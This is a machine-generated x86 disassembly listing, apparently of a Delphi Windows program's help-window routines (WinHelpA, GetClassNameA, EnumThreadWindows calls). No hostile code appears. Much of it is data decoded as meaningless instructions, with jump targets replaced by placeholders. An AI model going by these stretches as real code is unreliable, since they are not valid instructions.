add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc esp
add [ ebx + 0x44 ] al
add [ eax ] al
sub [ esp + eax * 2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
inc esp
add [ eax + eax ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
sub_446454
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446509
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404038
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4040d0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446510
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043b8
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_446524
push ebx
mov ebx eax
mov eax ebx
call sub_446854
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405934
sub_446560
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4465c7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_446454
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4465ce
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_4465d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_446660
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44654c
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043b8
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446667
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_446673
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4466fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_446d98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446702
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_446454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446680
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4466fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_446d98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446702
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_446454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446708
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446800
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_446454
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_40911c
mov eax ebx
call sub_446d98
test al al
je r-xdata
mov ecx sub_4462a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446807
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_446454
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_446cf0
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40408c
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446870
push ebx
mov ebx eax
mov eax ebx
call sub_446854
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405934
pop ebx
retn
mov eax rw-data
call sub_405934
sub_4468a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4468f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4468ff
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_446454
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_446908
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4469fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_4090dc
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_446454
mov eax ebx
call sub_446d98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a05
lea eax [ ebp - 0x110 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042a8
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_446cf0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042a8
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446a1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_446a7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446a85
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446454
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_446a90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_446b10
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_446454
mov eax ebx
call sub_446d98
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b17
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_446cf0
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446c20
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408b40
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_446c7b
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408b1c
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_446cf0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_446d66
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_446cd4
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d6d
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407fa4
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_446d7c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_446d98
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_446cd4
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_446d78
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_446d7c
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_446df4
sub_446df4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_446e71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_446854
call GetTickCount
mov ebx eax
push 0x0
call sub_406478
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_446454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446e78
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_446e80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40360c
call sub_40594c
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_446ec8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_446ef4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_446f62
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446f69
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405934
mov eax rw-data
call sub_405934
mov eax rw-data
call sub_405934
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_405934
mov eax [ rw-data ]
call sub_446524
sub_446f6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_446fbe
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446fc5
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_446e80
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405934
mov edx eax
mov eax [ rw-data ]
call sub_42d2ac
sub_446fc9
outsd
inc esp
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
aam 0x9d
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
add [ esi + ebx * 4 + 0x44 ] al
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x6c004032 ] bl
pushfd
inc esp
add [ eax - 0x53ffbb63 ] dh
popfd
inc esp
add [ eax + 0x1400449c ] dh
pushfd
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 8 + 0x70 ] si
inc esp
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x70 ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
call 0x144b458
pop es
push esp
inc ebx
jne r-xdata
inc esp
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add [ eax + esi * 2 + 0x44 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4470 0x0
xor al 0x0
jae r-xdata
add ah dl
popfd
inc esp
add [ 0x61724454 ] cl
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
enter 0x4471 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
jo r-xdata
jb r-xdata
add [ ebx + 0x447148c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bh
add [ eax ] al
add [ eax + 0x70 ] bl
inc esp
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
add ah cl
popfd
inc esp
add ah dl
popfd
add [ eax ] al
mov al 0x10
inc eax
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 ] ah
inc esp
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x6c004032 ] bl
add [ eax + eax ] dh
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
add [ eax + 0x44 ] dh
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add ah bh
outsd
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
pushfd
inc esp
add [ eax - 0x53ffbb63 ] dh
popfd
inc esp
add [ eax + 0x1400449c ] dh
pushfd
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
xor al [ eax ]
cwde
xor al [ eax ]
insb
outsd
insd
enter 0x449d 0x0
int3
je r-xdata
add al cl
popfd
inc esp
inc esp
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
sub_447244
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x40004472
add [ eax ] al
add [ ecx + esi * 2 + 0x44 ] bh
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 ] ah
inc esp
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x3bffbfce ] bl
sahf
inc esp
add al bh
sahf
inc esp
add [ eax ] dl
lahf
inc esp
add [ eax + 0x6c00449c ] dh
sahf
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add [ edi + ebx * 4 ] bl
inc esp
add ah cl
popfd
inc esp
add [ edi + ebx * 4 ] bh
inc esp
add [ eax + 0x4800449e ] bl
sahf
inc esp
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc esp
add [ eax ] dl
lahf
inc esp
add [ eax + 0x6c00449c ] dh
sahf
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add [ edi + ebx * 4 ] bl
inc esp
add ah cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ ecx ] bh
inc esp
add [ ebp + ebx * 4 - 0x634fffbc ] ch
inc esp
add ah dh
lahf
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
inc ebx
outsd
outsb
je r-xdata
popfd
inc esp
add [ edi + ebx * 4 ] bh
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x18 ] si
jae r-xdata
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 8 + 0x73 ] si
inc esp
popfd
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
test al 0x73
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jae r-xdata
add [ eax - 0x3bffbfce ] bl
sahf
inc esp
add al bh
sahf
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x44 ] al
add [ eax ] al
add [ eax ] al
inc eax
jb r-xdata
inc ecx
add [ edi + ecx * 4 ] ah
inc ecx
add ah cl
push esi
inc edx
add [ eax + 0x4c004256 ] bh
mov bl 0x44
add [ esi ] cl
push esp
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
or [ ebp + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 2 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ebp + 0x44 ] dh
add ah dl
popfd
inc esp
add [ eax - 0x60 ] dl
inc esp
add [ eax - 0x61 ] ah
inc esp
add [ eax + 0x140044a0 ] bl
mov eax [ 0xffffffffa1280044 ]
inc esp
add [ eax - 0x5f ] cl
inc esp
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add ah cl
popfd
inc esp
add ah dl
popfd
inc esp
add [ eax - 0x60 ] dl
inc esp
add [ eax - 0x61 ] ah
inc esp
add [ eax + 0x140044a0 ] bl
mov eax [ 0xffffffffa1280044 ]
inc esp
add [ eax - 0x5f ] cl
inc esp
add [ edi ] cl
push esp
inc esp
jb r-xdata
add [ eax ] dh
add [ eax ] al
jl r-xdata
add [ eax + 0x4800449e ] bl
sahf
inc esp
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ edi + ebx * 4 + 0x44 ] bl
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x6fffbde9 ] bh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ eax - 0x5f ] dl
inc esp
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah al
lahf
inc esp
add ah al
sahf
inc esp
add [ ecx ] bh
inc esp
add [ ebp + ebx * 4 - 0x634fffbc ] ch
inc esp
add ah dh
lahf
inc esp
add [ esp + ebx * 4 + 0x44 ] dh
add al cl
popfd
inc esp
add ah cl
popfd
inc esp
add [ ebx + 0x44746cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70004474 ] ch
add [ eax ] al
add [ ebx + esi * 2 + 0x44 ] bl
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 4 + 0x73 ] si
inc esp
add [ edx + esi * 2 ] cl
inc esp
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add al dh
xor al 0x40
add [ esi + ebx * 4 ] dh
inc esp
add [ esi + ebx * 4 ] ah
inc esp
add [ esi + 0x34f80040 ] al
inc eax
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah al
lahf
inc esp
add ah al
sahf
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x44763c90
add [ ebx ] al
or al 0x54
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
jae r-xdata
add [ eax ] al
outsd
insd
popad
je r-xdata
inc esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x75
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jne r-xdata
xor al 0x75
inc esp
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
outsd
outsb
je r-xdata
add [ eax + eax ] ah
add [ esi + ebp + 0x34f00042 ] bl
inc eax
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] ah
mov bl 0x44
add [ eax ] cl
nop
inc ecx
add [ eax ] dl
nop
inc edx
add [ eax + 0x200044b7 ] dh
sbb [ edx ] al
pop esp
mov eax 0x17700044
inc edx
add [ eax + ebx ] al
inc edx
add [ eax + 0x18 ] bl
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc esp
imul ebp [ esi + 0x64 ] 0x1
inc eax
outsd
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + esi * 2 + 0x640b0044 ] dh
jae r-xdata
inc esp
jb r-xdata
push ebx
add ecx [ edx ]
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bh
jbe r-xdata
mov ch 0x44
add ah ch
pop ss
mov eax 0x90004217
jae r-xdata
